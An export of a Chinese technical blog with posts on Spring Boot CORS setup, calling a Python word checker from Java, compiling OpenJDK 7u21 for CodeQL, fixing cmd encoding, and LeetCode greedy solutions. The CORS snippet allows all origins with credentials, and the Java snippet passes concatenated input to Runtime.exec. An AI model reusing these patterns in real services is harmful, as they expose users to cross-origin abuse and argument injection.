    <content><![CDATA[<h3 id="springboot配置跨域请求"><a href="#springboot配置跨域请求" class="headerlink" title="springboot配置跨域请求"></a>springboot配置跨域请求</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.CorsRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;</span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebMvcConfig</span> <span class="keyword">implements</span> <span class="title">WebMvcConfigurer</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addCorsMappings</span><span class="params">(CorsRegistry registry)</span> </span>&#123;</span><br><span class="line">        registry.addMapping(<span class="string">&quot;/**&quot;</span>)</span><br><span class="line">                .allowedHeaders(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;X-Requested-With&quot;</span>,<span class="string">&quot;accept,Origin&quot;</span>,<span class="string">&quot;Access-Control-Request-Method&quot;</span>,<span class="string">&quot;Access-Control-Request-Headers&quot;</span>,<span class="string">&quot;token&quot;</span>)</span><br><span class="line">                .allowedMethods(<span class="string">&quot;*&quot;</span>)</span><br><span class="line">                .allowedOriginPatterns(<span class="string">&quot;*&quot;</span>)</span><br><span class="line">                .allowCredentials(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="验证输入是否为单词"><a href="#验证输入是否为单词" class="headerlink" title="验证输入是否为单词"></a>验证输入是否为单词</h3><p>因为python有一个<code>pyenchant</code>库恰好具备这样的功能</p>
<p><code>pip install pyenchant</code></p>
<p>但是java调用python之前并没有接触过</p>
<p>使用jpython来调用的时候总是报一些很奇怪的错误,要么是找不到第三方库,但是添加了库路径进去又报别的错误</p>
<p>由于这个地方只需要传递一个简单的单词的参数过去就行</p>
<p>所以考虑使用命令行传递参数的方式来实现,将true或者false打印到控制台给java读取</p>
<p>java只需要拼接命令执行即可</p>
<h5 id="python代码"><a href="#python代码" class="headerlink" title="python代码"></a>python代码</h5><p>verify.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> enchant</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">d = enchant.<span class="type">Dict</span>(<span class="string">&quot;en_US&quot;</span>)</span><br><span class="line"><span class="built_in">input</span>=sys.argv[<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(d.check(<span class="built_in">input</span>))</span><br></pre></td></tr></table></figure>

<p>采用sys库来获取参数,sys库获取到的参数数组中第一个是python后第一对空格包裹的,第二个才是word</p>
<h5 id="java代码"><a href="#java代码" class="headerlink" title="java代码"></a>java代码</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String word=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">      String cmd=<span class="string">&quot;python H:\python\verify.py &quot;</span>+word;</span><br><span class="line">      Process process=<span class="keyword">null</span>;</span><br><span class="line">      process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">      InputStreamReader inputStreamReader = <span class="keyword">new</span> InputStreamReader(process.getInputStream());</span><br><span class="line">      BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(inputStreamReader);</span><br><span class="line">      String res=bufferedReader.readLine();</span><br><span class="line">      <span class="keyword">if</span>(res.equals(<span class="string">&quot;True&quot;</span>))&#123;</span><br><span class="line">          System.out.println(<span class="string">&quot;是单词&quot;</span>);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">          System.out.println(<span class="string">&quot;不是单词&quot;</span>);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>在windows上面很容易就实现了功能</p>
<p>在linux上部署则遇见了一个问题<br><code>ImportError: The &#39;enchant&#39; C library was not found and maybe needs to be installed.</code><br>原因按照字面意思就是缺少了enchant这个字符库<br>所以需要进行一下安装<br>CentOS 7安装Enchant：<br><code>yum install enchant</code><br>Ubuntu 安装Enchant：<br><code>apt-get install libenchant1c2a</code></p>
<p>顺利解决之后改一改路径就可以实现了</p>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>centos编译openjdk7成功---但是创建codeql数据库失败的记录</title>
    <url>/2022/05/16/%E7%BC%96%E8%AF%91jdk7%E5%B9%B6%E6%9E%84%E5%BB%BAcodeql%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
    <content><![CDATA[<h2 id="centos编译openjdk7成功—但是创建codeql数据库失败的记录"><a href="#centos编译openjdk7成功—但是创建codeql数据库失败的记录" class="headerlink" title="centos编译openjdk7成功—但是创建codeql数据库失败的记录"></a>centos编译openjdk7成功—但是创建codeql数据库失败的记录</h2><blockquote>
<p>实验环境</p>
<p>centos7</p>
<p>jdk1.6.0_45 (这点很重要,起初由于使用了jdk8作为bootjdk导致莫名其妙的报错,查询了很久才解决)</p>
</blockquote>
<p>本篇文章可以作为编译openjdk7的参考,但是由于不熟悉编译原理,到底为什么可以编译openjdk7却不能像openjdk8一样生成对应的codeql数据库就不知道为啥了</p>
<p>安装所需库和工具,依次执行按y即可</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install cups-devel.x86_64</span><br><span class="line">yum install freetype.x86_64 freetype-devel.x86_64</span><br><span class="line">yum install alsa*</span><br><span class="line">yum install ant</span><br><span class="line">yum install cups-devel</span><br><span class="line">yum install glibc-static libstdc++-static</span><br><span class="line">yum install libX*</span><br><span class="line">yum install libXt-devel</span><br><span class="line">yum install libXrender-devel</span><br><span class="line">yum install libXext-devel</span><br><span class="line">yum install libXtst-devel</span><br><span class="line">yum install gcc gcc-c++</span><br><span class="line">yum install freetype-devel</span><br><span class="line">yum install libstdc++-static</span><br></pre></td></tr></table></figure>

<h3 id="安装BootJdk"><a href="#安装BootJdk" class="headerlink" title="安装BootJdk"></a>安装BootJdk</h3><p>去官网下载安装jdk1.6</p>
<blockquote>
<p>链接<a href="https://www.oracle.com/java/technologies/javase-java-archive-javase6-downloads.html">https://www.oracle.com/java/technologies/javase-java-archive-javase6-downloads.html</a></p>
</blockquote>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220516125517310.png" alt="image-20220516125517310"></p>
<p>下载下来通过ssh工具传到usr/local目录下</p>
<p><code>chmod 775 jdk-6u45-linux-x64.bin </code></p>
<p>使用改命令修改其为可执行</p>
<p><code>./jdk-6u45-linux-x64.bin</code></p>
<p>会自动在当前目录解压出来一个<code>jdk1.6.0_45</code></p>
<p>接着,修改系统变量</p>
<p><code>vim /etc/profile</code></p>
<p>在最下面插入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#set Java enviroment</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/usr/<span class="built_in">local</span>/jdk1.6.0_45</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> JRE_HOME=<span class="variable">$&#123;JAVA_HOME&#125;</span>/jre</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> CLASSPATH=.:<span class="variable">$&#123;JAVA_HOME&#125;</span>/lib:<span class="variable">$&#123;JRE_HOME&#125;</span>/lib:/usr/<span class="built_in">local</span>/src/apache-ant-1.8.2/lib/ant-launcher.jar</span><br><span class="line"></span><br><span class="line"><span class="comment">#set Ant enviroment</span></span><br><span class="line"></span><br><span class="line">ANT_HOME=/usr/<span class="built_in">local</span>/src/apache-ant-1.8.2</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$JAVA_HOME</span>/bin:<span class="variable">$ANT_HOME</span>/bin:<span class="variable">$CLASSPATH</span>:<span class="variable">$JRE_HOME</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure>

<p>然后<code>!wq</code>退出</p>
<p><code>source /etc/profile</code>更新变量</p>
<p><code>java-version</code></p>
<p>显示为jdk1,6即配置成功</p>
<h3 id="下载openjdk"><a href="#下载openjdk" class="headerlink" title="下载openjdk"></a>下载openjdk</h3><p>直接去官网下载很慢,推荐一个技巧,参考链接<a href="https://blog.csdn.net/wbo112/article/details/121584122">https://blog.csdn.net/wbo112/article/details/121584122</a></p>
<p>文章中添加的是openjdk的仓库,我们在openjdk的github仓库那里搜索jdk7u按照一样的方式即可生成到码云</p>
<p>我们需要编译的是jdk7u21,在生成好的jdk7u仓库里面通过标签找到对应版本下载即可</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220516132045787.png" alt="image-20220516132045787"></p>
<p>通过ssh上传到centos的任意位置</p>
<p>然后通过<code>unzip</code>进行解压</p>
<p>解压完成后进入解压出来的目录</p>
<p>在里面创建bash脚本</p>
<p><code>touch jdk.sh</code></p>
<p><code>chmod jdk.sh</code></p>
<p><code>vim jdk.sh</code></p>
<p>往里面添加</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> LANG=C</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> ALT_BOOTDIR=/usr/<span class="built_in">local</span>/jdk1.6.0_45</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> ALT_JDK_IMPORT_PATH=/usr/<span class="built_in">local</span>/jdk1.6.0_45</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> ALLOW_DOWNLOADS=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> HOTSPOT_BUILD_JOBS=4</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> ALT_PARALLEL_COMPILE_JOBS=4</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> SKIP_COMPARE_IMAGES=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> USE_PRECOMPILED_HEADER=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> BUILD_LANGTOOLS=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#export BUILD_JAXP=false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> BUILD_JAXWS=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#export BUILD_CORBA=false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> BUILD_HOTSPOT=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> BUILD_JDK=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> DISABLE_HOTSPOT_OS_VERSION_CHECK=ok</span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> SKIP_DEBUG_BUILD=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> SKIP_FASTDEBUG_BUILD=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> DEBUG_NAME=debug</span><br><span class="line"></span><br><span class="line">BUILD_DEPLOY=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line">BUILD_INSTALL=<span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> ALT_OUTPUTDIR=/usr/<span class="built_in">local</span>/src/openjdk/build</span><br><span class="line"></span><br><span class="line"><span class="built_in">unset</span> JAVA_HOME</span><br><span class="line"></span><br><span class="line"><span class="built_in">unset</span> CLASSPATH</span><br><span class="line"></span><br><span class="line">make sanity</span><br></pre></td></tr></table></figure>

<p>然后<code>!wq</code>退出并保存</p>
<p>接着<code>source ./jdk.sh</code></p>
<p>如果输出结果为Sanity check passed表示编译检查通过(但是不代表编译一定不会出错)</p>
<p>如果检查通过了,不要切换终端,(因为设定的变量在其他终端中无法读取)</p>
<p>就在当前终端中输入<code>make</code>进行编译</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220516124540997.png" alt="image-20220516124540997"></p>
<p>最终在经过大概15分钟的等待之后,出现这段字符就表示编译成功了,我这里两分钟是因为已经编译过一次了</p>
<h3 id="生成codeql数据库失败"><a href="#生成codeql数据库失败" class="headerlink" title="生成codeql数据库失败"></a>生成codeql数据库失败</h3><p>我编译jdk7u21的数据库的初衷是想使用codeql编写7u21反序列化漏洞的查询语句试试水</p>
<p>对编译原理啥的都不咋了解,甚至连jdk为啥要编译都不知道…</p>
<p>编译数据库的过程是参考的这篇大佬编译jdk8数据库的<a href="https://blog.csdn.net/mole_exp/article/details/122330521">文章</a></p>
<p>按照本篇文章的操作,只要通过make编译jdk的准备都做好,并且make编译还成功了的话,使用这段语句便可成功编译出jdk的codeql数据库</p>
<p><code>codeql database create openjdk7u21-db --language=&quot;java&quot; --command=&quot;make&quot; --overwrite</code></p>
<p>但是不知道为什么在jdk7上面行不通,如果后面编译成功了的话,再来更新这篇文章</p>
<blockquote>
<p>参考文章</p>
<p><a href="https://blog.csdn.net/m0_37726449/article/details/81226606">https://blog.csdn.net/m0_37726449/article/details/81226606</a></p>
<p><a href="https://blog.csdn.net/mole_exp/article/details/122330521">https://blog.csdn.net/mole_exp/article/details/122330521</a></p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>解决cmd的中文乱码问题</title>
    <url>/2024/09/29/%E8%A7%A3%E5%86%B3cmd%E7%9A%84%E4%B8%AD%E6%96%87%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>在设置中找到时间和语言选项</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202409291621904.png" alt="image-20240929162053821"></p>
<p>在右下角找到管理语言设置</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202409291621756.png" alt="image-20240929162121640"></p>
<p>点击更改系统区域设置,勾选<code>使用unicode UTF-8提供全球语言支持</code></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202409291622712.png" alt="image-20240929162217664"></p>
]]></content>
      <tags>
        <tag>cmd</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>贪心</title>
    <url>/2024/09/30/%E8%B4%AA%E5%BF%83/</url>
    <content><![CDATA[<h1 id="贪心"><a href="#贪心" class="headerlink" title="贪心"></a>贪心</h1><h4 id="455-分发饼干"><a href="#455-分发饼干" class="headerlink" title="455. 分发饼干"></a><a href="https://leetcode.cn/problems/assign-cookies/">455. 分发饼干</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011106163.png" alt="image-20241001110624065"></p>
<p>本题的核心点在于每个孩子只能有一个饼干</p>
<p>如果是每个孩子能得到多块饼干,应该胃口和饼干都从小到大,依次用1或者多块饼干满足孩子,这样能满足的孩子是最多的</p>
<p>为了不浪费饼干,将饼干从大到小分发给胃口从大到小的孩子们(能满足胃口的),或者小饼干喂小胃口也行</p>
<p><strong>这里的局部最优就是大饼干喂给胃口大的，充分利用饼干尺寸喂饱一个，全局最优就是喂饱尽可能多的小孩</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findContentChildren</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; g, vector&lt;<span class="keyword">int</span>&gt;&amp; s)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sort</span>(g.<span class="built_in">begin</span>(), g.<span class="built_in">end</span>());</span><br><span class="line">        <span class="built_in">sort</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> child = g.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> cookie = s.<span class="built_in">size</span>() - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (child &gt;= <span class="number">0</span> &amp;&amp; cookie &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s[cookie] &gt;= g[child]) &#123;</span><br><span class="line">                res++;</span><br><span class="line">                child--;</span><br><span class="line">                cookie--;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                child--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="376-摆动序列"><a href="#376-摆动序列" class="headerlink" title="376. 摆动序列"></a><a href="https://leetcode.cn/problems/wiggle-subsequence/">376. 摆动序列</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011008982.png" alt="image-20241001100819885"></p>
<p>这题往复杂想还有点难</p>
<p>简单的思路就是:用1代表上升,-1代表下降,初始pre为-2</p>
<p>统计cur和pre不同的数值,也就是转折点,对于水平线则跳过,最后返回转折点的数量+1</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">wiggleMaxLength</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> slow = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> cur = <span class="number">0</span>, pre = <span class="number">-2</span>;</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> dif = nums[i] - nums[i - <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (dif == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            cur = dif &gt; <span class="number">0</span> ? <span class="number">1</span> : <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">if</span> (cur != pre) &#123;</span><br><span class="line">                ans++;</span><br><span class="line">                pre = cur;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="53-最大子数组和"><a href="#53-最大子数组和" class="headerlink" title="53. 最大子数组和"></a><a href="https://leetcode.cn/problems/maximum-subarray/">53. 最大子数组和</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011106737.png" alt="image-20241001110644206"></p>
<p>局部最优是如果当前已经选取的数组和是个负数(如果不舍弃则会影响再加入元素的数值变得更小),直接舍弃从下一个元素重新开始计算max</p>
<p>注意:在舍弃负数之前先将其和maxSub比较一下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxSubArray</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> maxSub = INT_MIN;</span><br><span class="line">        <span class="keyword">int</span> cur = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            cur += nums[i];</span><br><span class="line">            maxSub = <span class="built_in">max</span>(maxSub, cur);</span><br><span class="line">            <span class="keyword">if</span> (cur &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                cur = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxSub;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="122-买卖股票的最佳时机-II"><a href="#122-买卖股票的最佳时机-II" class="headerlink" title="122. 买卖股票的最佳时机 II"></a><a href="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock-ii/">122. 买卖股票的最佳时机 II</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011107609.png" alt="image-20241001110707507"></p>
<p>这题更是贪心的具象化</p>
<p>把所有的涨幅都买入,所有跌幅都躲过去</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 保证每天都赚钱</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; prices.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; prices.<span class="built_in">size</span>() - <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (prices[i] &lt; prices[i + <span class="number">1</span>]) &#123;</span><br><span class="line">                    res += prices[i + <span class="number">1</span>] - prices[i];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="55-跳跃游戏"><a href="#55-跳跃游戏" class="headerlink" title="55. 跳跃游戏"></a><a href="https://leetcode.cn/problems/jump-game/">55. 跳跃游戏</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011107905.png" alt="image-20241001110716814"></p>
<p>不用管他是怎么跳的,只需要维护能跳到的最远距离即可</p>
<p>注意:如果当前能跳的最远距离连下一个格子都跳不到,就直接<code>false</code>,不要再往后循环</p>
<p>最后如果前n-1个格子遍历完的最大范围大于等于第n个的下标,就<code>true</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">canJump</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> cover = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> curCover = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>() - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            curCover = i + nums[i];</span><br><span class="line">            cover = <span class="built_in">max</span>(cover, curCover);</span><br><span class="line">            <span class="keyword">if</span> (cover &lt; i + <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (cover &gt;= nums.<span class="built_in">size</span>() - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>





<h4 id="45-跳跃游戏-II"><a href="#45-跳跃游戏-II" class="headerlink" title="45. 跳跃游戏 II"></a><a href="https://leetcode.cn/problems/jump-game-ii/">45. 跳跃游戏 II</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011107994.png" alt="image-20241001110724903"></p>
<p>记录当前能跳的范围(先判断当前的范围是不是已经能跳完了),然后从当前能跳的范围内选一个能跳的最远的格子,跳到这个格子,重复上述循环,直到范围大于等于n-1;</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">jump</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> cover = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> nextCover = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (nums.<span class="built_in">size</span>() == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        cover = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (cover &gt;= nums.<span class="built_in">size</span>() - <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i; j &lt;= cover &amp;&amp; j &lt; nums.<span class="built_in">size</span>(); j++) &#123;</span><br><span class="line">                nextCover = <span class="built_in">max</span>(nextCover, nums[j] + j);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (nextCover &gt; cover) &#123;</span><br><span class="line">                res++;</span><br><span class="line">                cover = nextCover;</span><br><span class="line">            &#125;</span><br><span class="line">            nextCover = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="1005-K-次取反后最大化的数组和"><a href="#1005-K-次取反后最大化的数组和" class="headerlink" title="1005. K 次取反后最大化的数组和"></a><a href="https://leetcode.cn/problems/maximize-sum-of-array-after-k-negations/">1005. K 次取反后最大化的数组和</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011107043.png" alt="image-20241001110732948"></p>
<p>第一想法是排序后先把负数取反消耗k,但是这样有个问题:k还剩余,并且所有元素都为正数的时候,不好找最小值去消耗k</p>
<p>故采用绝对值逆序排序,这样就算全是正数了,它也是单调递减的</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">int</span>&amp; a, <span class="keyword">int</span>&amp; b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> tempA = a &gt; <span class="number">0</span> ? a : -a;</span><br><span class="line">        <span class="keyword">int</span> tempB = b &gt; <span class="number">0</span> ? b : -b;</span><br><span class="line">        <span class="keyword">return</span> tempA &gt; tempB;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">largestSumAfterKNegations</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>(), cmp);</span><br><span class="line">        <span class="comment">// 按照绝对值排序</span></span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>() - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &lt; <span class="number">0</span> &amp;&amp; k &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                sum += -nums[i];</span><br><span class="line">                k--;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                sum += nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (k &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (k % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                sum += nums[nums.<span class="built_in">size</span>() - <span class="number">1</span>];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                sum += -nums[nums.<span class="built_in">size</span>() - <span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            sum += nums[nums.<span class="built_in">size</span>() - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



